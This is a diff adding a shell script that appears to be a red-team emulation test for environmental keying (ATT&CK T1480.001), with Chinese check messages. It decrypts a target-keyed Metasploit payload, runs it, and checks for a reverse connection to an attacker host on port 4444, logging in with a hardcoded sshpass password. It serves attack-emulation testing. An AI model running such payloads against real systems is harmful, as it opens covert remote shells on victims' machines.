@@ -1,0 +1,23 @@
+;
+#pre
+sshpass -p "010404" ssh -o StrictHostKeyChecking=no grz@10.10.21.232 "cd ~/metasploit ; chmod u+x ./msf_auto.sh ; tmux new-session -d -s msf_session './msf_auto.sh'"
+sleep 10
+#command
+python3 /home/ubuntu/attack/T1480.001.py decrypt /tmp/test_T1480_enc /tmp/test_T1480
+chmod u+x /tmp/test_T1480
+tmux new-session -d -s T1480_session '/tmp/test_T1480'
+#check
+echo "查看加密文件类型："
+file /tmp/test_T1480_enc
+echo "使用环境密钥（靶机ip地址）解密，查看解密文件类型："
+file /tmp/test_T1480
+echo "查看解密后的文件（metasploit的payload）运行情况："
+ps -ef | grep -v grep | grep "/tmp/test_T1480$"
+echo "查看payload与攻击机连接情况："
+lsof_stat="$(sshpass -p "010404" ssh -o StrictHostKeyChecking=no grz@10.10.21.232 "lsof -i :4444")"
+echo "$lsof_stat"
+if ! grep -q "ESTABLISHED" <<< "$lsof_stat"; then echo "No such file or directory"; fi
+#cleanup
+rm /tmp/test_T1480_enc /tmp/test_T1480
+tmux kill-session -t T1480_session
+sshpass -p "010404" ssh -o StrictHostKeyChecking=no grz@10.10.21.232 "tmux kill-session -t msf_session"
